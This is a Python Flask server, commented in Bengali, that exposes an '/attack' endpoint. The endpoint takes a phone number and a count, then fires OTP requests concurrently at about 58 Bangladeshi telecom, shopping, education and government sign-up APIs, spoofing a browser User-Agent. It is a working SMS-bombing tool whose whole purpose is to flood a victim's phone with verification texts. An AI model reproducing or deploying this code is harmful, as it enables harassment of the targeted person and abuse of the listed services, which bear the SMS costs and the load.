from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import concurrent.futures
import logging

app = Flask(__name__)
CORS(app)

# টার্মিনালে লগ দেখার জন্য কনফিগারেশন
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_request(api, phone):
    full_phone = "88" + phone
    url = api['url'].replace("{phone}", phone).replace("{full_phone}", full_phone)
    method = api['method']
    data = api.get('data')

    try:
        # Data ফরম্যাট ঠিক করা
        if data:
            new_data = {}
            for key, value in data.items():
                if isinstance(value, str):
                    new_data[key] = value.replace("{phone}", phone).replace("{full_phone}", full_phone)
                else:
                    new_data[key] = value
            data = new_data

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        # রিকোয়েস্ট পাঠানো
        if method == "POST":
            res = requests.post(url, json=data, timeout=8, headers=headers)
        else:
            res = requests.get(url, timeout=8, headers=headers)
        
        if res.status_code < 400:
            logging.info(f"SUCCESS: {url}")
            return True
        else:
            logging.warning(f"FAILED ({res.status_code}): {url}")
            return False
    except Exception as e:
        logging.error(f"ERROR: {url} - {str(e)}")
        return False

@app.route('/attack', methods=['POST'])
def attack():
    req_data = request.json
    if not req_data or 'phone' not in req_data:
        return jsonify({"error": "Invalid request"}), 400
        
    phone = req_data.get('phone')
    amount = int(req_data.get('amount', 1))

    # ৫৭টি শক্তিশালী API লিস্ট
    apis = [
        {"url": "https://webauth.pathao.com/auth/get-otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://webloginda.grameenphone.com/backend/api/v1/otp", "method": "POST", "data": {"msisdn": "{full_phone}"}},
        {"url": "https://www.robi.com.bd/backend/api/v1/otp/send-otp", "method": "POST", "data": {"msisdn": "{full_phone}"}},
        {"url": "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full_phone}&lang=en&ng=0", "method": "GET"},
        {"url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}", "method": "GET"},
        {"url": "https://webloginda.grameenphone.com/backend/api/v1/otp", "method": "POST", "data": {"msisdn": "{full_phone}"}},
        {"url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.apex4u.com/api/auth/login", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://bb-api.bohubrihi.com/public/activity/otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method": "POST", "data": {"mobile": "{phone}"}},
        {"url": "https://training.gov.bd/backoffice/api/user/sendOtp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://da-api.robi.com.bd/da-nll/otp/send", "method": "POST", "data": {"msisdn": "{full_phone}"}},
        {"url": "https://core.easy.com.bd/api/v1/registration", "method": "POST", "data": {"mobile": "{phone}"}},
        {"url": "https://prod.etestpaper.net/api/auth/signup", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://foodaholic.com.bd/api/v1/auth/sign-up", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api-gateway.sundarbancourierltd.com/graphql", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://mujib.chorcha.net/auth/register", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://waltonplaza.com.bd/api/auth/otp/create", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://foodcollections.com/api/v1/auth/login", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://chokrojan.com/api/v1/passenger/login/mobile", "method": "POST", "data": {"mobile_number": "{phone}"}},
        {"url": "https://billing.proiojon.com/api/v1/auth/login", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://auth.qcoom.com/api/v1/otp/send", "method": "POST", "data": {"mobileNumber": "{phone}"}},
        {"url": "https://backend.sailor.clothing/api/v2/auth/signup", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://pbs.com.bd/login/?handler=UserGetOtp", "method": "POST", "data": {"MobileNo": "{phone}"}},
        {"url": "https://api.shikho.com/auth/v2/send/sms", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.bdtickets.com:20100/v1/auth", "method": "POST", "data": {"phoneNumber": "{phone}"}},
        {"url": "https://api.doctime.com.bd/api/v2/authenticate", "method": "POST", "data": {"contact_no": "{phone}"}},
        {"url": "https://api.kabbik.com/v1/auth/otpnew", "method": "POST", "data": {"msisdn": "{phone}"}},
        {"url": "https://mbonlineapi.com/api/front/send/otp", "method": "POST", "data": {"CellPhone": "{phone}"}},
        {"url": "https://offers.sindabad.com/api/mobile-otp", "method": "POST", "data": {"mobile": "{phone}"}},
        {"url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister", "method": "POST", "data": {"Phone": "{phone}"}},
        {"url": "https://developer.medha.info/api/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://webloginda.robi.com.bd/backend/api/v1/otp", "method": "POST", "data": {"phone_number": "{phone}"}},
        {"url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://edge.ali2bd.com/api/consumer/v1/auth/login", "method": "POST", "data": {"username": "{phone}"}},
        {"url": "https://admin.beautybooth.com.bd/api/v2/auth/register", "method": "POST", "data": {"value": "{phone}"}},
        {"url": "https://api.chardike.com/api/otp/send", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": "{phone}"}},
        {"url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": "{phone}"}},
        {"url": "https://api.englishmojabd.com/api/v1/auth/login", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.gorillamove.com/api/v1/core/account/phone_login", "method": "POST", "data": {"phone_number": "{phone}"}},
        {"url": "https://manambd.com/_public/api/send/otp", "method": "POST", "data": {"mobile_no": "{phone}"}},
        {"url": "https://www.shwapno.com/api/auth", "method": "POST", "data": {"phoneNumber": "{phone}"}},
        {"url": "https://api.ghoorilearning.com/api/auth/signup/otp", "method": "POST", "data": {"mobile_no": "{phone}"}},
        {"url": "https://moveonbd.com/api/v1/customer/auth/phone/request-otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.swap.com.bd/api/v1/send-otp/v2", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.arogga.com/auth/v1/sms/send/", "method": "POST", "data": {"mobile": "{phone}"}},
        {"url": "https://web-api.binge.buzz/api/v3/otp/send/{phone}", "method": "GET"},
        {"url": "https://www.khaasfood.com/wp-admin/admin-ajax.php", "method": "POST", "data": {"mobileNo": "{phone}"}},
        {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", "method": "POST"},
        {"url": "https://www.rokomari.com/otp/send?emailOrPhone={phone}&countryCode=BD", "method": "POST"},
        {"url": "https://api.medeasy.health/api/send-otp/{phone}/", "method": "GET"},
        {"url": "https://api.fbs.com.bd/api/v1/auth/otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.chaldal.com/api/v1/auth/otp/send", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.sheba.xyz/v1/api/send-otp", "method": "POST", "data": {"mobile": "{phone}"}},
        {"url": "https://api.pickaboo.com/api/v1/customer/send-otp", "method": "POST", "data": {"phone": "{phone}"}},
        {"url": "https://api.sobujchai.com/api/v1/auth/otp", "method": "POST", "data": {"phone": "{phone}"}}
    ]

    success = 0
    failed = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
        for _ in range(amount):
            futures = [executor.submit(send_request, api, phone) for api in apis]
            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    success += 1
                else:
                    failed += 1

    return jsonify({"success": success, "failed": failed})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
